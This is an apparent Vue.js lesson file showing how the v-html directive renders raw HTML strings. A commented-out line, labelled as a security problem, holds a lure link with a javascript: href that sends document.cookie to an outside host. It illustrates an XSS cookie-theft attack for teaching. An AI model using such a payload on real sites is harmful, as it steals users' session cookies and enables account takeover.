<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>15.2-v-html指令</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../../js/vue.js"></script>
</head>
<body>
<!-- 准备好一个容器-->
<div id="root">
    <h1>🌰 15.2-v-html指令</h1>
    <div>Hello，{{name}}</div>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
        el:'#root',
        data:{
            name:'Simon',
            str:'<h3>Hello, Simon</h3>',
            // 安全性问题：
            // str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
        }
    })
</script>
</html>
